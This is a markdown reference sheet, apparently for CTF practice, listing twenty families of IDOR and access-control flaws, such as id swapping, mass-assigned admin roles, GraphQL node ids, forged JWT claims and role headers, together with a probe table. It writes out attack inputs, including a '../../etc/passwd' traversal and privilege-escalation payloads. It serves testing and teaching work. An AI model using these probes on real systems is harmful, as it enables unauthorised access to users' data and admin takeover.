# Real-world cases — the published IDOR patterns

The shapes that have appeared in disclosed reports. CTF-shaped, not
box-recipes.

---

## 1. The "change the id in the URL" family

The classic — `GET /api/v3/customers/{id}` / `GET /users/{id}` /
`GET /account/{id}` — a sequential or uuid id; `?id=1`/`?id=2` returns
another's record. The disclosed forms:

- The `id` in the path, no scope check.
- The `id` in the body — `POST /api/data {"id":...}`.
- The `id` in a JWT claim.
- The `id` in a base64/encoded form.

## 2. The "the API returns more than the UI" family

`GET /api/users/42` returns fields the HTML page hides — `email`,
`phone`, `ssn`, `role`, `secret` — the API serializer leaks the full
object. The IDOR is the object+field combination.

## 3. The "the export is the leak" family

`POST /export {"user_id":1}` / `GET /report?for=1` / `GET /users/1/export`
— the export runs with a service identity; the `user_id` in the request
is the IDOR. The exported PDF/CSV carries another's data.

## 4. The "the GraphQL node" family

`query { node(id:"VXNlcjo0MQ==") {...} }` — the Relay `node(id:)` is a
free object lookup; decode the b64, change `Type:41`→`Type:1`, re-encode.

## 5. The "the mass-assign on register" family

`POST /register {"username":"x","role":"admin"}` — the register binds
the `role` field; the created user is admin. Variants:

- `{"role":"admin"}` / `{"role_id":1}` / `{"is_admin":true}`
- `{"isAdmin":true}` / `{"admin":true}` / `{"superuser":true}`
- `{"user":{"role":"admin"}}` / `{"user[role]":"admin"}` — nested
- `{"account":{"role":"admin"}}` / `{"data":{"role":"admin"}}`
- `{"attributes":{"role":"admin"}}` / `{"params":{"role":"admin"}}`
- `{"roles":["admin"]}` / `{"groups":["admin"]}` / `{"permissions":["*"]}`

## 6. The "the share link is predictable" family

`/shared/{token}` where the token is sequential, a uuid v1, a hash of a
predictable, or `b64(Type:id)` — enumerate the share links.

## 7. The "the file is the id" family

`?file=report_42.pdf` / `?doc=42` / `/download/42` — the filename is
the id; `?file=../../etc/passwd` or `?file=report_admin.pdf`.

## 8. The "the bulk is unscoped" family

`GET /users?ids=1,2,3` / `POST /bulk {"ids":[...]}` / `POST /export
{"user_ids":[...]}` — the bulk operation returns all the ids' objects.

## 9. The "the filter param overrides" family

`GET /orders?user_id=1` / `?owner=1` / `?author=1` / `?account=1` —
the filter param overrides the session-scope.

## 10. The "the version is unguarded" family

`/api/v1/users/42` checked, `/api/v2/users/42` not — a new API version
without the authz.

## 11. The "the function is hidden" family

`/admin/users` / `/admin/flag` / `/internal/debug` — the privileged
route exists, unlinked, unchecked.

## 12. The "the role is a param/header/cookie" family

`?role=admin` / `X-Role: admin` / `Cookie: role=admin` — the role is
a client-supplied value, not the session.

## 13. The "the JWT sub is the user" family

`{"sub":1}` / `{"uid":1}` / `{"user_id":1}` / `{"role":"admin"}` —
the JWT claim names the user; a weak/none signature lets you forge it.

## 14. The "the parent is checked, the child isn't" family

`/users/42/orders/1001` — the parent `42` is checked but the child
`1001` is reachable across users.

## 15. The "the create binds a foreign owner" family

`POST /orders {"user_id":1}` — you create an object *as* another user.

## 16. The "the action skips the check" family

`POST /orders/42/cancel` / `.../refund` / `.../approve` / `.../share` —
the action handler skips the owner check.

## 17. The "the field-list picks the column" family

`?fields=id,email,role,secret` / `?include=role` / `?expand=user.role`
— the field-picker reaches privileged columns.

## 18. The "the WS message" family

`{"type":"subscribe","channel":"user:1"}` / `{"type":"get","id":42}` —
the WS handler doesn't re-check per message.

## 19. The "the multipart carries the id" family

`Content-Disposition: form-data; name="user_id"` `1` — the multipart
field carries the id.

## 20. The "the second-order is the bot" family

`POST /submit {"url":"/notes/42"}` — a bot visits as admin; the page
renders A's note; XSS exfiltrates.

## 21. The pattern → probe table

| Report shape | The probe |
|---|---|
| `id` in path | `id_sweep` / the two-identity `http_probe` |
| `id` in body | `--body '{"id":{id}}'` |
| `id` in JWT | `jwt_forge --claims '{"sub":1}'` |
| `id` in b64 | decode → change → encode |
| export `user_id` | `POST /export {"user_id":1}` |
| GraphQL `node(id:)` | `node(id:"VXNlcjox")` |
| register `role` | `POST /register {"role":"admin"}` |
| share token | predict the token |
| `?file=` | traversal / adjacent file |
| bulk `?ids=` | `?ids=1,2,3` / `POST /bulk` |
| filter `?user_id=` | `?user_id=1` |
| version `/api/v2/` | the v2 path |
| `/admin/*` | the function route |
| `?role=admin` | the param |
| `X-Role:` | the header |
| `Cookie: role=` | the cookie |
| parent/child | `/users/42/orders/1001` |
| create `{"user_id"}` | `POST {"user_id":1}` |
| action `POST /42/x` | the action verb |
| `?fields=` | the field-list |
| WS `{"channel":"user:1"}` | the WS message |
| multipart `name=user_id` | the form field |
| bot `{"url":"/notes/42"}` | the second-order |
